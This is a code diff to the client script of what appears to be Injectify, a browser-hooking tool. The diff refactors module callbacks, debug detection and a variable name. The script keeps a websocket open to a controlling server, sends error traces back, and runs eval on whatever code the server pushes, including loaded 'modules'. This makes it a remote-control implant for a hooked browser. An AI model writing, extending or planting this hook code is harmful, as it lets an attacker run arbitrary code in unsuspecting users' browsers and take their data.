@@ -20,7 +20,6 @@ window['injectify'] = /** @class */ (function () {
                 }
             }
             catch (e) {
-                //throw e
                 _this.send('e', e.stack);
             }
         };
@@ -83,7 +82,10 @@ window['injectify'] = /** @class */ (function () {
      * @param {function} callback optional callback once the module has been loaded
      */
     Injectify.module = function (name, params, callback) {
-        window["callbackFor" + name] = callback;
+        if (typeof params === 'function')
+            callback = params;
+        if (typeof callback === 'function')
+            window["callbackFor" + name] = callback;
         this.send('module', {
             name: name,
             params: params
@@ -104,14 +106,12 @@ window['injectify'] = /** @class */ (function () {
          * Returns information about Injectify
          */
         get: function () {
-            var project = ws.url.split('?')[1], debug = false;
-            if (project.charAt(0) == "$") {
+            var project = ws.url.split('?')[1];
+            if (this.debug)
                 project = project.substring(1);
-                debug = true;
-            }
             return {
                 project: atob(project),
-                debug: debug,
+                debug: this.debug,
                 websocket: ws.url,
             };
         },
@@ -125,7 +125,7 @@ window['injectify'] = /** @class */ (function () {
          * false - console output should be suppressed
          */
         get: function () {
-            return this.info.debug;
+            return ws.url.split('?')[1].charAt(0) == "$";
         },
         enumerable: true,
         configurable: true
@@ -148,12 +148,12 @@ window['injectify'].listen('*', function (data, topic) {
             return;
         }
         if (/^module:/.test(topic)) {
-            var module = topic.substring(7), callback = window["callbackFor" + module];
+            var Module = topic.substring(7), callback = window["callbackFor" + Module];
             eval(data);
             if (data !== false && typeof callback == 'function') {
-                callback();
+                callback(module.return);
             }
-            delete window["callbackFor" + module];
+            delete window["callbackFor" + Module];
             return;
         }
         eval(data);
